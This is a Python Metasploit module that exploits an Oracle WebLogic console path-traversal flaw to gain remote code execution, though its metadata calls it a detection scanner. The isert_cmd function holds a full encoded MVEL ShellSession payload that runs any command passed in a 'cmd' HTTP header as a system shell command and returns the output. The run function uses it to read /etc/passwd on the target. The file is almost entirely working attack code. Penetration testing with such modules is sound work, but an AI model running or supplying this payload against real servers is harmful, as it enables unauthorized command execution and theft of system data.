#!/usr/bin/env python3

# standard modules
from metasploit import module

# extra modules
dependencies_missing = False
try:
    import requests, json
    from urllib3.exceptions import ProtocolError
    import http.client
except ImportError:
    dependencies_missing = True

http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

requests.packages.urllib3.disable_warnings()

metadata = {
    'name': 'Oracle WebLogic Remote Code Execution',
    'description': '''
        This module detect Oracle WebLogic rce.
    ''',
    'authors': [
        'amylin',
    ],
    'date': '2022-04-07',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'cve', 'ref': '2021-14882'}
    ],
    'type': 'single_scanner',
    'options': {
        'RPORT': {'type': 'int', 'description': 'Target port', 'required': True, 'default': 7001},
        'TARGETURI': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'}
    }
}

def find_base_url(args):
    base_url = f"http://{args['rhost']}:{args['RPORT']}{args['TARGETURI']}"
    try:
        result = requests.get(base_url, timeout=3)
    except ProtocolError:
        base_url = f"https://{args['rhost']}:{args['RPORT']}{args['TARGETURI']}"
        result = requests.get(base_url, timeout=3)
    return base_url

def isert_cmd(base_url, cmd):
    url_cmd = base_url + """console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("%5C%5CA").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')"""
    headers_cmd = {
        'User-Agent':'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
        'cmd':cmd,
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type':'application/x-www-form-urlencoded'
    }
    
    res = requests.get(url_cmd, headers = headers_cmd,timeout = 15, verify = False)
    if "<html" not in res.text and "<TITLE" not in res.text:
        return True
    else:
        return False


def run(args):
    try:
        # dependency check
        if dependencies_missing:
            module.log('Module dependency (requests) is missing, cannot continue', level='error')
            return

        # check
        base_url = find_base_url(args)
        cmd = "cat /etc/passwd"

        if isert_cmd(base_url, cmd):
            module.log('Successfully remote code execution', level='good')
        else:
            module.log('Failed to remote code execution', level='error')

    except Exception as e:
        module.log(str(e), level='error')


if __name__ == '__main__':
    module.run(metadata, run)